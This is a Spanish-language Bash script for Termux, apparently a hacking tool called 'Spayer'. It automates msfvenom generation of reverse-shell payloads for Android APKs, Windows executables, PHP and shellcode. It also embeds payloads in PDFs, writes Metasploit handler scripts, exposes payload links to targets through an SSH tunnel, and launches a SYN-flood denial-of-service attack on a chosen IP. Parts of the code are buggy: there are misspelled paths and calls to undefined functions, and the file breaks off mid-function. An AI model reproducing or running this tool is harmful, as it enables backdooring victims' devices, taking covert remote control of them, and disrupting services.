#! /data/data/com.termux/files/usr/bin/bash
	R='\033[1;31m'
        G='\033[1;32m'
        Y='\033[1;33m'
        B='\033[1;34m'
        M='\033[1;35m'
        C='\033[1;36m'
        W='\033[0m'
	TMP_DIR=$HOME/Spayer

function Banner {
	echo $(clear)
	echo
	printf "$Y"
	echo "              ____"
	echo "             / ___| _ __   __ _ _   _  ___ _ __"
	echo "             \___ \|  _ \ / _  | | | |/ _ \  __|"
	echo "              ___) | |_) | (_| | |_| |  __/ |"
	echo "             |____/| .__/ \__,_|\__, |\___|_|"
	echo "                   |_|          |___/"
	printf "$R               Cesar Hacker The Gray"
	printf "$W
	\n"
}

function Chao_chao {
	echo $(clear)
        echo "
        "
        printf "$G"
	echo "     Buscame En You Tube :: https://youtu.be/QA6GwNA2uEs"
  	echo "          ________"
	echo "         / ______ \ "
	echo "         || _  _ || "
	echo "         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK "
	echo "         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK  "
	echo "         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK   "
	echo "         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK  "
	echo "         |||_||_|||         AAA  AAA  PPP       KKK  KKK "
	echo "         ||______||         AAA  AAA  PPP       KKK  KKK"
	echo "        /__________\ "
	echo "________|__________|________________________________________________"
	echo "       /____________\ "
	echo "       |____________|     Cesar Hacker The Gray     (v .1.0.3)"
	echo "======================================================================"
	printf "$C"
	echo "       (1)   Buscame en las redes sosiales como:"
	echo "       (3)   Nombre : Cesar Hackeando desde android"
	echo "       (4)   Youtube: https://youtu.be/QA6GwNA2uEs"
	echo "       (5)   Telegram: https://t.me/CesarGray"
	echo "       (6)   Facebook: Cesar Hack Gray"
	printf "$W"
        echo "
        "
}
function server {
chmod +x $payload_name*
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] inisiando tunel...\e[0m\n"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net -R $default_port3:localhost:$lport 2> /dev/null &
sleep 3
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envíaando el primer enlace al target. + /%s%s:\e[0m\e[1;77m \n' $payload_name $format
php -S localhost:$port > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Inisiando MSF Console...\e[0m\n'
printf "\n"
#nc -lvp $default_port2


}
function listener {
default_listr="Y"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Queres inisiar con la escucha MSF ?\e[0m\e[1;77m [Y/n]: ' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
	Chao_chao
touch $TMP_DIR/handler/Cesar.rc
printf "use exploit/multi/handler\n" >> $TMP_DIR/handler/Cesar.rc
printf "set payload %s\n" $PAYLOAD >> $TMP_DIR/handler/Cesar.rc
printf "set LHOST 127.0.0.1\n" >> $TMP_DIR/handler/Cesar.rc
printf "set LPORT %s\n" $lport >> $TMP_DIR/handler/Cesar.rc
printf "set ExitOnSession false\n" >> $TMP_DIR/handler/Cesar.rc
printf "exploit -j -z\n" >> $TMP_DIR/handler/Cesar.rc
server
msfconsole -r $TMP_DIR/handler/Cesar.rc
rm -rf $TMP_DIR/handler/Cesar.rc
fi

}
function start {

default_port=$(seq 1111 4444 | sort -R | head -n1)
default_lport=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
lport="${lport:-${default_lport}}"
port="${port:-${default_port}}"
default_payload_name="payload"
printf "$C [Set]$R Nuevo nombre >> $Y (Ejemplo:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m" $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"



}
function menu {
banner5

echo
echo
echo -e "$Y [01] $G Generador de PAYLOADS (metasploit)"
echo -e "$Y [02] $G Infectar apk original (backdoor)"
echo -e "$Y [03] $G Infectar PDF (Hacking windows) "
echo -e "$Y [04] $G Crear payloads exe (hack windows)"
echo -e "$Y [05] $G Crear payloads php infectar windows (php)"
echo -e "$Y [06] $G Ataque de ddos desde metasploit"
echo -e "$Y [07] $G Generador de links ( Hack Windows ) msfconsole"
echo -e "$Y [08] $G Generar Payloads binarios ejecutables (exe)"
echo -e "$Y [09] $G Contactar a César 💀💀"
echo -e "$Y [10] $G Shellcode"
echo -e "$Y [00] $R Salir [exit]"
echo

	echo
printf "$C [Set]$R PAYLOAD@CesarHack>> $Y"
	while read -p " >> " POLVO && [ -z $POLVO ]; do
		printf "\n $R
		Gray Porfavor ecoje un el tipo de payload
		$W \n"
	done

	if [[ $POLVO == 1 || $POLVO == 01 ]]; then
polvo10
	elif [[ $POLVO == 2 || $POLVO == 02 ]]; then
polvo9
	elif [[ $POLVO == 3 || $POLVO == 03 ]]; then
polvo7
	elif [[ $POLVO == 4 || $POLVO == 04 ]]; then
polvo1
	elif [[ $POLVO == 5 || $POLVO == 05 ]]; then
polvo8
	elif [[ $POLVO == 6 || $POLVO == 06 ]]; then
polvo5
	elif [[ $POLVO == 7 || $POLVO == 07 ]]; then
polvo3
	elif [[ $POLVO == 8 || $POLVO == 08 ]]; then
polvo6
	elif [[ $POLVO == 9 || $POLVO == 09 ]]; then
polvo4

	elif [ $POLVO -eq '10' ]; then
menu2

	elif [ $POLVO -eq '00' ]; then
adios

	fi

}
function polvo10 {
hacking
	banner4
echo
echo -e "$C PAYLOADS"
echo -e "$Y [1] $C android/meterpreter/reverse_http"
echo -e "$Y [2] $C android/meterpreter/reverse_https"
echo -e "$Y [3] $C android/meterpreter/reverse_tcp"
echo -e "$Y [4] $C android/shell/reverse_http"
echo -e "$Y [5] $C android/shell/reverse_https"
echo -e "$Y [6] $C android/shell/reverse_tcp"
echo
echo
printf "$C [Set]$R Android@Cesarhack$Y"
	while read -p " >> " android && [ -z $android ]; do
		printf "\n $R
		[Gray] porfavor escribe una ospion
		$W \n"
	done

	if [ $android -eq '1' ]; then
PAYLOAD="android/meterpreter/reverse_http"
start
android1
listener
	elif [ $android -eq '2' ]; then
PAYLOAD="android/meterpreter/reverse_https"
start
android2
listener
	elif [ $android -eq '3' ]; then
PAYLOAD="android/meterpreter/reverse_tcp"
start
android3
listener
	elif [ $android -eq '4' ]; then
PAYLOAD="android/shell/reverse_http"
start
android4
listener
	elif [ $android -eq '5' ]; then
PAYLOAD="android/shell/reverse_https"
start
android5
listener
	elif [ $android -eq '6' ]; then
PAYLOAD="android/shell/reverse_tcp"
start
android6
listener
fi
}
function banner4 {
	echo $(clear)
echo ""
echo ""
echo -e "$G==============================================================="
echo "            ____             _       _"
echo "           | __ )  __ _  ___| | ____| | ___   ___  _ __"
echo "           |  _ \ / _  |/ __| |/ / _  |/ _ \ / _ \|  __|"
echo "           | |_) | (_| | (__|   < (_| | (_) | (_) | |"
echo "           |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|"
echo -e "$G==============================================================="
echo -e $C"	                    ______    "
echo "	                 .-        -. "
echo "	                /            \         "
echo "	               |,  .-.  .-.  ,|      "
echo "	               | )(_ /  \_ )( |"
echo "	               |/     /\     \|    "
echo -e $C"	   $Y  (@_   $C    <__    ^^    __>        "
echo -e $C"      _       ) $R\_______$C""\__|IIIIII|__/$R""_____________________ "
echo -e $C"     (_)$Y\@8@8{}<$R""___________________________________________$Y> "
echo -e $C"              )_/  $C       \ IIIIII /                    "
echo -e $C"	   $Y  (@        $C    --------                      "
echo -e $C"       	         version backdoor >$R v1.2.3"
echo -e $C"		  Injector backdoor for android"
echo -e " 	       Creador : $Y""Cesar Hacker The Gray"
echo -e $R"     Spayer$R Injection a appks ataques$R androidPlatform"	  
echo
echo



}
function android1 {
	banner2
format=".apk"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 R > $TMP_DIR/PAYLOAD/$payload_name.apk

}
function android2 {
	banner3
format=".apk"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 R > $TMP_DIR/PAYLOAD/$payload_name.apk

}
function android3 {
	banner4
format=".apk"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 R > $TMP_DIR/PAYLOAD/$payload_name.apk

}
function android4 {
	banner5
format=".apk"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 R > $TMP_DIR/PAYLOAD/$payload_name.apk

}
function android5 {
	banner3
format=".apk"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 R > $TMP_DIR/PAYLOAD/$payload_name.apk

}
function android6 {
	banner2
format=".apk"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 R > $TMP_DIR/PAYLOAD/$payload_name.apk



}
function polvo9 {
hacking
cd $HOME/Spayer/César
./.CesarHackGray
}
function polvo7 {
hacking
banner4
echo
echo -e "$C PAYLOADS"
echo -e "$Y [1] $C windows/meterpreter/reverse_http"
echo -e "$Y [2] $C windows/meterpreter/reverse_https"
echo -e "$Y [3] $C windows/meterpreter/reverse_tcp"
echo -e "$Y [4] $C windows/shell/reverse_http"
echo -e "$Y [5] $C windows/shell/reverse_https"
echo -e "$Y [6] $C windows/shell/reverse_tcp"
echo
printf "$C [Set]$R Windows@Cesarhack$Y"
	while read -p " >> " Hack && [ -z $Hack ]; do
		printf "\n $R
		[Gray] selecciona un payload
		$W \n"

	done
printf "$C [Set]$R Ruta del PDF$Y"
	while read -p " >> " PDF && [ -z $PDF ]; do
		printf "\n $R
		[Gray] porfavor nesesitamos un pdf
		$W \n"
	done

				if [ ! -e $PDF ]; then
				echo
				echo
        			 printf "$R [Gray error tu PDF no existe
                        	$W \n"
                        	sleep 2
                        	polvo7
                        fi

	if [ $Hack -eq '1' ]; then
PAYLOAD="windows/meterpreter/reverse_http"
start
PDF1
listener
	elif [ $Hack -eq '2' ]; then
PAYLOAD="windows/meterpreter/reverse_https"
start
PDF1
listener
	elif [ $Hack -eq '3' ]; then
PAYLOAD="windows/meterpreter/reverse_tcp"
start
PDF1
listener
	elif [ $Hack -eq '4' ]; then
PAYLOAD="windows/shell/reverse_http"
start
PDF1
listener
	elif [ $Hack -eq '5' ]; then
PAYLOAD="windows/shell/reverse_https"
start
PDF1
listener
	elif [ $Hack -eq '5' ]; then
PAYLOAD="windows/shell/reverse_https"
start
PDF1
listener
	
	fi
}
function PDF1 {
hacking 
banner4
echo
touch $TMP_DIR/Gray/$payload_name.rc
echo "use windows/fileformat/adobe_pdf_embedded_exe" >> $TMP_DIR/Gray/$payload_name.rc
echo "set INFILENAME $PDF" >> $TMP_DIR/Gray/$payload_name.rc
echo "set set FILENAME $payload_name" >> $TMP_DIR/Gray/$payload_name.rc
echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/Gray/$payload_name.rc
echo "set LHOST $lhost" >> $TMP_DIR/Gray/$payload_name.rc
echo "set LPORT $default_port3" >> $TMP_DIR/Gray/$payload_name.rc
echo "exploit" >> $TMP_DIR/Gray/$payload_name.rc
echo "exit" >> $TMP_DIR/Gray/$payload_name.rc
chmod 777 $TMP_DIR/Gray/$payload_name.rc

msfconsole -q -r $TMP_DIR/Gray/$payload_name.rc

}
function adios {
Banner
echo
echo
echo -e "$B [*] $W Spayer stop"
echo
echo



}
function polvo1 {
hacking
banner3
echo
echo -e "$C PAYLOADS"
echo -e "$Y [1] $C windows/meterpreter/reverse_http"
echo -e "$Y [2] $C windows/meterpreter/reverse_https"
echo -e "$Y [3] $C windows/meterpreter/reverse_tcp"
echo -e "$Y [4] $C windows/shell/reverse_http"
echo -e "$Y [5] $C windows/shell/reverse_https"
echo -e "$Y [6] $C windows/shell/reverse_tcp"
echo
printf "$C [Set]$R Windows@Cesarhack$Y"
	while read -p " >> " windows && [ -z $windows ]; do
		printf "\n $R
		[Gray] selecciona un payload
		$W \n"
	done

	if [ $windows -eq '1' ]; then
PAYLOAD="windows/meterpreter/reverse_http"
start
windows1
listener
	elif [ $windows -eq '2' ]; then
PAYLOAD="windows/meterpreter/reverse_https"
start
windows2
listener
	elif [ $windows -eq '3' ]; then
PAYLOAD="windows/meterpreter/reverse_tcp"
start
windows3
listener
	elif [ $windows -eq '4' ]; then
PAYLOAD="windows/shell/reverse_http"
start
windows4
listener
	elif [ $windows -eq '5' ]; then
PAYLOAD="windows/shell/reverse_https"
start
windows5
listener
	elif [ $windows -eq '6' ]; then
PAYLOAD="windows/shell/reverse_tcp"
start
windows6
listener
fi
}
function menu2 {
hacking
banner3
banner4                                                                 echo -e "$R [@] $G Shellcode base payloads:\e[0m\n"
echo
echo -e "$Y [1] $R Linux"
echo -e "$Y [2] $R Windows"
echo -e "$Y [3] $R MAC"
echo
echo -e "$Y [0] $R Menu"
echo
echo
printf "$C [Set]$R PAYLOAD@CesarHack>> $Y"
	while read -p " >> " option_shell && [ -z $option_shell ]; do
		printf "\n $R
		Gray Porfavor ecoje un el tipo de payload
		$W \n"
	done

if [[ $option_shell == 1 ]]; then
payload="linux/x86/meterpreter/reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 2 ]]; then
payload="windows/meterpreter/reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 3 ]]; then
payload="osx/x86/shell_reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 0 ]]; then

menu

fi

}
function shellcode_based {
hacking2
banner3
echo -e "$C [*] $G Lenguajes:\e[0m\n"
echo
echo -e "$G [01] $C C               $G [12] $C pl"

echo -e "$G [02] $C Bash            $G [13] $C powershell"
echo -e "$G [03] $C CSharp          $G [14] $C ps1"
echo -e "$G [04] $C dw              $G [15] $C py"
echo -e "$G [05] $C dword           $G [16] $C python"
echo -e "$G [06] $C hex             $G [17] $C raw"
echo -e "$G [07] $C java            $G [18] $C rb"
echo -e "$G [08] $C js_be           $G [19] $C ruby"
echo -e "$G [09] $C js_le           $G [20] $C sh"
echo -e "$G [10] $C num             $G [21] $C vbapplication"
echo -e "$G [11] $C perl            $G [22] $C vbscript"
echo -e "$G [99] $C Salir" 
echo
echo
read -p $'\e[1;92m[*] Lenguaje@CesarHack :\e[0m\e[1;77m ' option_lang
if [[ $option_lang == 1 || $option_lang == 01 ]]; then
lang="c"
elif [[ $option_lang == 2 || $option_lang == 02 ]]; then
lang="bash"
elif [[ $option_lang == 3 || $option_lang == 03 ]]; then
lang="csharp"
elif [[ $option_lang == 4 || $option_lang == 04 ]]; then
lang="dw"
elif [[ $option_lang == 5 || $option_lang == 05 ]]; then
lang="dword"
elif [[ $option_lang == 6 || $option_lang == 06 ]]; then
lang="hex"
elif [[ $option_lang == 7 || $option_lang == 07 ]]; then
lang="java"
elif [[ $option_lang == 8 || $option_lang == 08 ]]; then
lang="js_be"
elif [[ $option_lang == 9 || $option_lang == 09 ]]; then
lang="js_le"
elif [[ $option_lang == 10 ]]; then
lang="num"

elif [[ $option_lang == 11 ]]; then
lang="perl"

elif [[ $option_lang == 12 ]]; then
lang="pl"
echo n
elif [[ $option_lang == 13 ]]; then
lang="powershell"

elif [[ $option_lang == 14 ]]; then
lang="ps1"

elif [[ $option_lang == 15 ]]; then
lang="py"
elif [[ $option_lang == 16 ]]; then
lang="python"
elif [[ $option_lang == 17 ]]; then
lang="raw"
elif [[ $option_lang == 18 ]]; then
lang="rb"
elif [[ $option_lang == 19 ]]; then
lang="ruby"
elif [[ $option_lang == 20 ]]; then
lang="sh"
elif [[ $option_lang == 21 ]]; then
lang="vbapplication"
elif [[ $option_lang == 22 ]]; then
lang="vbscript"
elif [[ $option_lang == 99 ]]; then
shellcode
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Opsion Invalida \e[0m"
sleep 0.5
clear
shellcode_based
fi
hacking
banner3

msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name 

}
function banner3 {

	echo $(clear)
echo
echo
echo -e $C"=================================================================="
echo "   ____  ____   ___   ____ ____      _    __  __ ___ _   _  ____"
echo "  |  _ \|  _ \ / _ \ / ___|  _ \    / \  |  \/  |_ _| \ | |/ ___|"
echo "  | |_) | |_) | | | | |  _| |_) |  / _ \ | |\/| || ||  \| | |  _"
echo "  |  __/|  _ <| |_| | |_| |  _ <  / ___ \| |  | || || |\  | |_| |"
echo "  |_|   |_| \_\\\___/ \____|_| \_\/_/   \_\_|  |_|___|_| \_|\____|"
echo -e $C"=================================================================="
echo -e $R""
echo -e $G"            ||||||||||||||	"
echo -e $R"           =              \       "
echo "           =               |	"
echo "          _=            ___/	"
echo -e "         / _\           ($G"o"$R)\	"
echo "        | | \            _  \	"
echo -e "        | |/            (____)	  $Y Cesar Hacker The Gray$R"
echo "         \__/          /   |	"
echo "          /           /  ___)	"
echo -e "         /    \       \    _)                       $G ) "
echo -e $R"        \      \           /       $G Spayer         $G  ( "
echo -e $R"      \/ \      \_________/   |\___________________ $G ) "
echo -e $R"       \/ \      /            |     $G"===="$R _______)__) "
echo -e "        \/ \    /           __/___  $G"===="$R _/  "
echo -e "         \/ \  /           ($G"O"$R ____)\\_(_/ "
echo -e "                          ($G"O"$R _ ____) "
echo -e "                           ($G"O"$R ____) "
echo ""
echo -e $C"================================================================= "





}
function windows1 {
	banner2
format=".exe"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f exe R > $TMP_DIR/exe/$payload_name.exe

}
function windows2 {
	banner3
format=".exe"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f exe R > $TMP_DID/exe/$payload_name.exe

}
function windows3 {
	banner5
format=".exe"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f exe R > $TMP_DID/exe/$payload_name.exe

}
function windows4 {
	banner3
format=".exe"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f exe R > $TMP_DID/exe/$payload_name.exe

}
function windows5 {
	banner4
format=".exe"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f exe R > $TMP_DID/exe/$payload_name.exe

}
function windows6 {
	banner3
format=".exe"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f exe R > $TMP_DID/exe/$payload_name.exe
}
function polvo6 {
hacking
banner3
echo
echo -e "$Y msfvenom -a x86 –platform windows"
echo -e "$C PAYLOADS"
echo -e "$Y [1] $G -a x86 –platform windows/meterpreter/reverse_http"
echo -e "$Y [2] $G -a x86 –platform windows/meterpreter/reverse_https"
echo -e "$Y [3] $G -a x86 –platform windows/meterpreter/reverse_tcp"
echo -e "$Y [4] $G -a x86 –platform windows/shell/reverse_http"
echo -e "$Y [5] $G -a x86 –platform windows/shell/reverse_https"
echo -e "$Y [6] $G -a x86 –platform windows/shell/reverse_tcp"
echo
echo
printf "$C [Set]$R Binario@Cesarhack$Y"
	while read -p " >> " Binario && [ -z $Binario ]; do
		printf "\n $R
		[Gray] selecciona una opsion
		$W \n"
	done

	if [ $Binario -eq '1' ]; then
PAYLOAD="windows/meterpreter/reverse_http"
start
binario1
listener
	elif [ $Binario -eq '2' ]; then
PAYLOAD="windows/meterpreter/reverse_https"
start
binario2
listener
	elif [ $Binario -eq '3' ]; then
PAYLOAD="windows/meterpreter/reverse_tcp"
start
binario3
listener
	elif [ $Binario -eq '4' ]; then
PAYLOAD="windows/shell/reverse_http"
start
binario4
listener 
	elif [ $Binario -eq '5' ]; then
PAYLOAD="windows/shell/reverse_https"
binario5
listener
	elif [ $Binario -eq '6' ]; then
PAYLOAD="windows/shell/reverse_tcp"
start
binario6
listener

	fi
}
function banner5 {

echo $(clear)

  echo -e $G"         ____							"
  echo -e $G"        |    | 	   $Y Cesar Hacker The Gray						"
  echo -e $G"        |____| 							"
  echo -e $G"       _|____|_      $G "
  echo -e $G"        /  $W"ee"\_      $G"
  echo -e $G"      .<     __O     $G "
  echo -e $G"     /\ \.-.' \      $G "
  echo -e $G"    J  \.|'.\/ \                  				"
  echo -e $G"    | |_.|. | | |   $G"[$G--$W] $C "   $W"Spayer" Echo para acceso remote   $W[$G--$W] 	"
  echo -e $G"     \__.' .|-' /   $W"[$G--$W] $C"  Creador > "$R"Cesar Hack Gray          $W[$G--$W]	"
  echo -e $G"     L   /|o'--'\   $W"[$G--$W] $C"           Version: $R"1.2.3"            $W[$G--$W]	"
  echo -e $G"     |  /\/\/\   \  $W"[$G--$W] $C" Contactame: $R"$C https://t.me/CesarGray" $W[$G--$W]"
  echo -e $G"     J /      \.__\ $W"[$G--$W] $C"  Buscame en github: $R@Cesar-Hacker   $W[$G--$W]"
  echo -e $G"     J /      \.__\ $W"[$G--$W] $C"  Dracos Linux : $R@dracos-linux.org   $W[$G--$W]	"
  echo -e $G"     |/         /   $W"[$G--$W] $C"   				      $W[$G--$W]		"
  echo -e $G"       \      .'\.  $W"[$G--$W]$W "    $W Realiza las configurasiones     $W[$G--$W]  "
  echo -e $G"    ____)_/\_(___\. $W"[$G--$W] ".___________________________________ $W[$G--$W]	"
  echo -e $G"   (___._/  \_.___)'$W\_.-----------------------------------------/	"
  echo
  echo



}
function polvo4 {
hacking
banner2
echo
echo -e "$C Hola soy Cesar apodado como Cesar Hack Gray"
echo -e "$C En creador de esta herramienta"
echo -e "$C Buscame en las redes sosiales"
echo -e "$C Facebook $Y>> $R Cesar Hack Gray"
echo -e "$C You tube $Y>> $R https://youtu.be/iPGmsxZzAYQ"
echo -e "$C Telegram $Y>> $R https://t.me/CesarGray"
echo -e "$C Saludos att ..$Y Cesar Hacker The Gray"
echo
echo
echo
printf "$C Presiona en $G enter $C para $G continuar"
read enter
menu




}
function binario1 {
	banner3
format=".exe"
msfvenom -a x86 –platform windows -p $PAYLOAD LHOST=$lhost 0.X LPORT=$default_port3 -b “\x00” -e x86/shikata_ga_nai -f exe R > $HOME/Spayer/exe/$payload_name.exe

}
function binario2 {
	banner2
format=".exe"
msfvenom -a x86 –platform windows -p $PAYLOAD LHOST=$lhost 0.X LPORT=$default_port3 -b “\x00” -e x86/shikata_ga_nai -f exe R > $HOME/Spayer/exe/$payload_name.exe

}
function binario3 {
	banner4
format=".exe"
msfvenom -a x86 –platform windows -p $PAYLOAD LHOST=$lhost 0.X LPORT=$default_port3 -b “\x00” -e x86/shikata_ga_nai -f exe R > $HOME/Spayer/exe/$payload_name.exe

}
function binario4 {
	banner2
format=".exe"
msfvenom -a x86 –platform windows -p $PAYLOAD LHOST=$lhost 0.X LPORT=$default_port3 -b “\x00” -e x86/shikata_ga_nai -f exe R > $HOME/Spayer/exe/$payload_name.exe

}
function binario5 {
	banner3
format=".exe"
msfvenom -a x86 –platform windows -p $PAYLOAD LHOST=$lhost 0.X LPORT=$default_port3 -b “\x00” -e x86/shikata_ga_nai -f exe R > $HOME/Spayer/exe/$payload_name.exe

}
function binario6 {
	banner4
format=".exe"
msfvenom -a x86 –platform windows -p $PAYLOAD LHOST=$lhost 0.X LPORT=$default_port3 -b “\x00” -e x86/shikata_ga_nai -f exe R > $TMP_DIR/exe/$payload_name.exe

}
function banner2 {
echo $(clear)
echo -e $C"========================================================================"
echo -e $G"            Metasploit Hackeando desde android con Cesar Hack Gray   "
echo -e $C"========================================================================"
echo -e $R""
echo "	 									"
echo "   	                  ..:::::::::..		"
echo "   	               ..:::aad8888888baa:::..	"
echo "   	           .::::d:?88888888888?::8b::::.	"
echo "   	         .:::d8888:?88888888??a888888b:::.	"
echo "   	       .:::d8888888a8888888aa8888888888b:::.	"
echo "   	      ::::dP::::::::88888888888::::::::Yb::::	"
echo "   	     ::::dP:::::::::Y888888888P:::::::::Yb::::	"
echo "   	    ::::d8:::::::::::Y8888888P:::::::::::8b::::	"
echo "   	   .::::88::::::::::::Y88888P::::::::::::88::::.	"
echo "   	   :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::	"
echo "   	   :::::::Y88888888888P::|::Y88888888888P:::::::	"
echo "   	   ::::::::::::::::888:::|:::888::::::::::::::::	"
echo "   	    :::::::::::::::8888888888888b::::::::::::::	"
echo "   	    :::::::::::::::88888888888888::::::::::::::	"
echo "   	     :::::::::::::d88888888888888::::::::::::: 	"
echo "   	      ::::::::::::88::88::88:::88::::::::::::	"
echo "   	        ::::::::::88::88::88:::88::::::::::	"
echo "   	          ::::::::88::88::P::::88::::::::	"
echo "   	            ::::::88::88:::::::88::::::	"
echo "   	                :::::::::::::::::::	"
echo "   	                     ::::::::: 	"
echo ""
echo -e -$C	"           Creador:$R "CesarHackGray" $C( Edo Hacking- ) "
echo -e "             Comunicate : $R "Telegram" $C( https://t.me/CesarGray "
echo -e "       Seguidores : $R Mickey Hacker >> Charly Hacker The Gray  "
echo -e $C"========================================================================"
echo -e $G"                Metasploit >> Cesar >> Mickey >> Charly  "
echo -e $C"========================================================================"
echo -e $C""


}
function polvo8 {
hacking
banner3
echo
echo -e "$C PAYLOADS"
echo -e "$Y [1] $C php/meterpreter/reverse_http"
echo -e "$Y [2] $C php/meterpreter/reverse_https"
echo -e "$Y [3] $C php/meterpreter/reverse_tcp"
echo -e "$Y [4] $C php/shell/reverse_http"
echo -e "$Y [5] $C php/shell/reverse_https"
echo -e "$Y [6] $C php/shell/reverse_tcp"
echo
printf "$C [Set]$R PHP@Cesarhack$Y"
	while read -p " >> " PHP && [ -z $PHP ]; do
		printf "\n $R
		[Gray] porfavor escribe una ospion
		$W \n"
	done

	if [ $PHP -eq '1' ]; then
PAYLOAD="php/meterpreter/reverse_http"
start
PHP1
listener
	elif [ $PHP -eq '2' ]; then
PAYLOAD="php/meterpreter/reverse_https"
start
PHP2
listener
	elif [ $PHP -eq '3' ]; then
PAYLOAD="php/meterpreter/reverse_tcp"
start
PHP3
listener
	elif [ $PHP -eq '4' ]; then
PAYLOAD="php/shell/reverse_http"
start
PHP4
listener
	elif [ $PHP -eq '5' ]; then
PAYLOAD="php/shell/reverse_https"
start
PHP5
listener
	elif [ $PHP -eq '6' ]; then
PAYLOAD="php/shell/reverse_tcp"
start
PHP6
listener
fi
}
function PHP1 {
	banner2
format=".php"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f raw > $HOME/Spayer/PHP/$payload_name.php

}
function PHP2 {
	banner3
format=".php"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f raw > $HOME/Sapyer/PHP/$payload_name.php

}
function PHP3 {
	banner4
format=".php"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f raw > $TMP_DIR/PHP/$payload_name.php

}
function PHP4 {
	banner2
format=".php"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f raw > $TMP_DIR/PHP/$payload_name.php

}
function PHP5 {
	banner3
format=".php"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f raw > $HOME/Spayer/PHP/$payload_name.php

}
function PHP6 {
	banner4
format=".php"
msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$default_port3 -f raw > $HOME/Spayer/PHP/$payload_name.php

}
function polvo5 {
hacking
banner4
echo
echo
printf "$C [Set]$R IP [PAJINA]$Y"
	while read -p " >> " DDos && [ -z $DDOS ]; do
		printf "\n $R
		[Gray] porfavor pon un IP de una pajina o la pajina
		$W \n"
	done

printf "$C [Set]$R Archivos Bsuras $C[1500]$Y"
        while read -p " >> " Basura && [ -z $Basura ]; do
                printf "\n $R
                [Gray] porfavor pon un puerto [LPORT]
                $W \n"
        done
Chao_chao
echo
echo -e "$C [Gray] $G Asiendo el ataque de ddos.."
echo
echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/handler/DDOS.rc
touch $TMP_DIR/handler/DDOS.rc
echo "use auxiliary/dos/tcp/synflood" >> $TMP_DIR/handler/DDOS.rc
echo "set RHOST $DDOS" >> $TMP_DIR/handler/DDOS.rc
echo "set SNAPLEN $Basura" >> $TMP_DIR/handler/DDOS.rc
echo "run" >> $TMP_DIR/handler/DDOS.rc
chmod 777 $TMP_DIR/handler/DDOS.rc

msfconsole -q -r $TMP_DIR/handler/DDos.rc

}
function polvo3 {
hacking
banner2
echo
printf "$C explotar exploit en $G metasploit"
echo
echo
echo
echo -e "$C (1) $Y exploit/windows/browser/ms10_018_ie_behaviors"
echo
echo -e "$C (2) $Y exploit/windows/browser/ms10_018_ie_tabular_activex"
echo
echo

echo
printf "$C [Set]$R Exploit@CesarHack$Y"
	while read -p " >> " link2 && [ -z $link2 ]; do
		printf "\n $R
		Gray Porfavor ecoje un explotations
		$W \n"
	done

	if [ $link2 -eq '1' ]; then
opsion1

	elif [ $link2 -eq '2' ]; then
opsion2

	fi
}
function opsion1 {
hacking
echo
banner2
echo
echo -e "$R Cesar Hacker The Gray by Backdooring"
echo
echo -e "$C PAYLOADS"
echo -e "$Y [1] $C windows/meterpreter/bind_http"
echo -e "$Y [2] $C windows/meterpreter/bind_https"
echo -e "$Y [3] $C windows/meterpreter/bind_tcp"
echo -e "$Y [4] $C windows/shell/bind_http"
echo -e "$Y [5] $C windows/shell/bind_https"
echo -e "$Y [6] $C windows/shell/bind_tcp"
echo
printf "$C [Set]$R Windows@Cesarhack$Y"
	while read -p " >> " link && [ -z $link ]; do
		printf "\n $R
		[Gray] porfavor escoje un payload
		$W \n"
	done
printf "$C [Set]$R RSHOST$Y"
        while read -p " >> " LHOST && [ -z $LHOST ]; do
                printf "\n $R
                [Gray] porfavor pon un IP [HOST]
                $W \n"
	done

printf "$C [Set]$R RSPORT$Y"
        while read -p " >> " LPORT && [ -z $LPORT ]; do
                printf "\n $R
                [Gray] porfavor pon un puerto [LPORT]
                $W \n"
        done
explotador

}
function opsion2 {
hacking
banner3
echo
echo
echo -e "$C PAYLOADS"
